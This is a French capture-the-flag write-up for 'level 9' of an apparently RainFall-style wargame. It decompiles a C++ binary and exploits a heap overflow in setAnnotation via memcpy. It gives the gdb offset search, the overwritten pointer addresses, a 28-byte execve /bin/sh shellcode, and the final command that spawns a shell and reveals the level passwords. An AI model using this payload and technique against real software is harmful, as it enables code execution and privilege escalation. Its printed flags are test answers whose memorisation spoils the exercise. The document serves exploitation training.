# Level 9

pass : `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

## Source :
```cpp
#include <string.h>

class N {  // ebp+0x8
public :
	char annotation[100];  // ebp+0x8 + 0x4 | size : 0x64 (0x68 - 0x4)
	int value;  // ebp+0x8 + 0x68

	N(int val) : value(val) {}  // 0x080486f6
	void	setAnnotation(char *str) {  // 0x0804870e
		int len = strlen(str);
		memcpy(annotation, str, len);
	}
	int		operator+(N const &rhs) {  // 0x0804873a
		return value + rhs.value;
	}
	int		operator-(N const &rhs) {  // 0x0804874e
		return value - rhs.value;
	}
};

int		main(int ac, char **av) {  // 0x080485f4
	if (ac <= 1)
		_exit(1);
	N *a = new N(5);  // esp+0x1c
	N *b = new N(6);  // esp+0x18

	N *c = a;  // esp+0x14
	N *d = b;  // esp+0x10

	c->setAnnotation(av[1]);
	return (*d + *c);
}
```

## Recherche :

Pour faire l'exploit, on va passer par le seul point d'entrée qu'on a, c'est à dire `av[1]`.
Aussi on voit dans l'assembleur que pour appeler `*d + *c`, il fait :
```asm
mov    eax,DWORD PTR [esp+0x10]
mov    eax,DWORD PTR [eax]
mov    edx,DWORD PTR [eax]
```

On va donc essayer d'écrire dans `EAX`.

Avec un `pattern create 130` et un `pattern search`, on s'apperçoit que `EAX` est écrit à partir de 108 caractères.

```sh
gdb-peda$ pattern search
Registers contain pattern buffer:
EAX+0 found at offset: 108
Registers point to pattern buffer:
[ECX] --> offset 12 - size ~118
[EDX] --> offset 0 - size ~130
[EBX] --> offset 108 - size ~22
Pattern buffer found at:
0x080492b6 : offset 27003 - size    4 (/home/kali/rainfall/level9)
0x0804ebb4 : offset    0 - size  130 ([heap])
0xb7c0c0c5 : offset 33208 - size    4 (/usr/lib/i386-linux-gnu/libm-2.30.so)
0xbffff448 : offset    0 - size  130 ($sp + 0x288 [162 dwords])
References to pattern buffer found at:
0xbffff188 : 0x0804ebb4 ($sp + -0x38 [-14 dwords])
0xbffff1a0 : 0x0804ebb4 ($sp + -0x20 [-8 dwords])
0xbffff190 : 0xbffff448 ($sp + -0x30 [-12 dwords])
0xbffff1a4 : 0xbffff448 ($sp + -0x1c [-7 dwords])
0xbffff1c4 : 0xbffff448 ($sp + 0x4 [1 dwords])
0xbffff288 : 0xbffff448 ($sp + 0xc8 [50 dwords])
```

Aussi on va vouloir lancer un shellcode, qu'on va pouvoir remplir dans `c->annotation`.
Pour retrouver l'adresse de `c->annotation`, on peut faire une breakpoint dans `memcpy` et voir les arguments qu'on a :

```gdb
(gdb) b *0x08048510
Breakpoint 1 at 0x8048510
(gdb) r "AAAA"
Starting program: /home/user/level9/level9 "AAAA"

Breakpoint 1, 0x08048510 in memcpy@plt ()
(gdb) x/4x $esp
0xbffff6dc:     0x08048738      0x0804a00c      0xbffff905      0x00000004
```

`c->annotation` est donc `0x0804a00c`, c'est à dire notre 1<sup>er</sup> argument.

```
(gdb) r $(python -c 'print "A"*108+"\x0c\xa0\x04\x08"')
Starting program: /home/user/level9/level9 $(perl -e 'print "A"x(108)."\x0c\xa0\x04\x08"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Bien, on a fait notre saut, mais le petit problème, c'est que comme il fait deux fois ` mov    eax,DWORD PTR [eax]`, on est allé à l'adresse `0x41414141` ("AAAA").

On corrige ça en changeant le début par l'adresse suivante :
`\x10\xa0\x04\x08` et en diminuant de 4 la longeur.

Et maintenant on va chercher un shellcode sur internet, comme celui-ci qui fait 28 bytes&nbsp;:
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

```gdb
(gdb) r $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(108-4-28)+"\x0c\xa0\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level9/level9 $(perl -e 'print "\x10\xa0\x04\x08"."\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"."\x90"x(108-4-28)."\x0c\xa0\x04\x08"')
process 7262 is executing new program: /bin/dash
$
```

Super !! Un prompt s'est affiché ! Il reste plus qu'à lancer ça en dehors de gdb :)

## Exploit :

```shell
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(108-4-28)+"\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cd ../bonus0
$ cat .pass 
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
